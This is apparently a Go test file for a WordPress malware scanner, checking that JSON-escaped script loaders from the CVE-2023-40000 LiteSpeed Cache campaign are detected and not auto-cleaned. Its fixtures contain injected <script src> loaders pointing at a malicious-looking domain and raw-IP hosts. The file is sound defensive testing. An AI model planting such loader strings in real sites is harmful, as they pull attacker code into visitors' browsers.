package checks

import (
	"strings"
	"testing"
)

// The campaign against CVE-2023-40000 stores its loader in a LiteSpeed Cache
// status option, JSON-encoded, which escapes every forward slash. The script
// regex requires "//" after the scheme, so "https:\/\/host\/payload.js" never
// matched and no script host was ever extracted from a real payload.
func TestExternalScriptHostsSeesJSONEscapedSlashes(t *testing.T) {
	value := `{"cdn_setup_err":"<script src=https:\/\/zeroday2024.com\/admin-bar-reloaded.min.js><\/script>"}`

	hosts := externalScriptHosts(value)

	if len(hosts) != 1 || hosts[0] != "zeroday2024.com" {
		t.Fatalf("hosts = %v, want [zeroday2024.com]", hosts)
	}
}

// Same payload, reached through the malicious-URL classifier: an injected
// loader on a throwaway host must still yield its URL once the escaping is
// undone, so the Critical path is not blind to the encoded form.
func TestMaliciousScriptURLSeesJSONEscapedSlashes(t *testing.T) {
	value := `{"cdn_setup_err":"<script src=http:\/\/198.51.100.7\/speed.js><\/script>"}`

	got := extractMaliciousScriptURL(value)

	if !strings.Contains(got, "198.51.100.7") {
		t.Fatalf("extractMaliciousScriptURL = %q, want the raw-IP loader URL", got)
	}
}

// Page builders store their content as JSON in post rows, so a loader
// injected there arrives with escaped slashes as well.
func TestPostScriptScanSeesJSONEscapedSlashes(t *testing.T) {
	content := `{"settings":{"html":"<script src=http:\/\/203.0.113.9\/loader.js><\/script>"}}`

	if !hasMaliciousExternalScriptInPost(content) {
		t.Fatal("escaped raw-IP loader in post content not detected")
	}
}

// Detection and removal stay paired: the remover works on the literal bytes,
// and rewriting an escaped payload inside a JSON or serialised blob would
// leave the stored structure inconsistent. Auto-response must therefore
// decline to write, leaving the finding for an operator to act on, rather
// than persisting a value that still carries the loader.
func TestEscapedPayloadIsNotAutoCleaned(t *testing.T) {
	value := `{"cdn_setup_err":"<script src=http:\/\/198.51.100.7\/speed.js><\/script>"}`
	previous := runMySQLQuery
	var wrote bool
	runMySQLQuery = func(_ wpDBCreds, query string) []string {
		if strings.HasPrefix(query, "UPDATE") || strings.HasPrefix(query, "INSERT") {
			wrote = true
		}
		return nil
	}
	t.Cleanup(func() { runMySQLQuery = previous })

	cleaned := backupAndCleanOption(wpDBCreds{dbName: "alice_wp"}, "wp_", "litespeed.cdn_setup._summary", value, "http://198.51.100.7/speed.js")

	if cleaned {
		t.Fatal("backupAndCleanOption claimed a clean for an escaped payload")
	}
	if wrote {
		t.Fatal("backupAndCleanOption wrote to the database for an escaped payload")
	}
}
